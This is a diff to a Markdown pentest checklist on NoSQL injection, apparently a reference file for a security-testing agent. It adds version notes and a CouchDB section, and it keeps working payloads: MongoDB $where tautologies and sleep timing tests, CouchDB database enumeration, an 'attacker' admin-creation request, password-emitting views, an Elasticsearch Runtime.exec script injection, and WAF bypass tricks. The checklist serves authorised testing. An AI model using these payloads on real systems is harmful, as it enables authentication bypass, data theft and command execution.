@@ -48,6 +48,7 @@ username=admin&password[$regex]=.*
 - [ ] Binary search character-by-character to extract full values
 
 ### 3. JavaScript Injection via $where
+Note: `$where` is deprecated in MongoDB 4.2+ and server-side JS removed in 5.0+. Test only if target runs MongoDB < 5.0.
 - [ ] Basic tautology
 ```json
 {"$where": "1==1"}
@@ -57,7 +58,7 @@ username=admin&password[$regex]=.*
 ```json
 {"$where": "this.password.match(/^a/) ? true : false"}
 ```
-- [ ] Blind timing injection
+- [ ] Blind timing injection (requires server-side JS enabled, pre-4.0)
 ```json
 {"$where": "sleep(5000) || true"}
 {"$where": "function(){sleep(5000);return true;}"}
@@ -78,7 +79,23 @@ username=admin&password[$regex]=.*
 \r\nSAVE\r\n
 ```
 
-### 6. Elasticsearch Query DSL Injection
+### 6. CouchDB Injection
+- [ ] Check for Fauxton admin panel: `GET /_utils/`
+- [ ] Unauthenticated database listing: `GET /_all_dbs`
+- [ ] Document enumeration: `GET /dbname/_all_docs?include_docs=true`
+- [ ] View injection via Mango query selectors:
+```json
+POST /dbname/_find
+{"selector": {"password": {"$regex": "^a"}}}
+```
+- [ ] Admin party (no auth configured): `PUT /_config/admins/attacker` with password value
+- [ ] JavaScript view injection if views accept user input:
+```json
+{"map": "function(doc) { emit(doc._id, doc.password); }"}
+```
+
+### 7. Elasticsearch Query DSL Injection
+Note: Inline scripting disabled by default since ES 5.x. Requires `script.inline: true` or Painless scripting context.
 - [ ] Script injection in search queries
 ```json
 {"query": {"bool": {"must": [{"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}]}}}
@@ -88,7 +105,7 @@ username=admin&password[$regex]=.*
 {"query": {"regexp": {"password": {"value": "a.*"}}}}
 ```
 
-### 7. WAF / Filter Bypass
+### 8. WAF / Filter Bypass
 - [ ] Unicode encoding of operators: `\u0024ne` for `$ne`
 - [ ] Nested objects: `{"username": {"$ne": null}}` vs flat params
 - [ ] Mixed Content-Type: send JSON body with `application/x-www-form-urlencoded` header
@@ -105,4 +122,3 @@ username=admin&password[$regex]=.*
 ## Extended Resources
 
 - `agent/references/payloads/nosql-injection-payloads.md` — MongoDB operators ($gt, $ne, $regex, $where), auth bypass, blind extraction
-- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
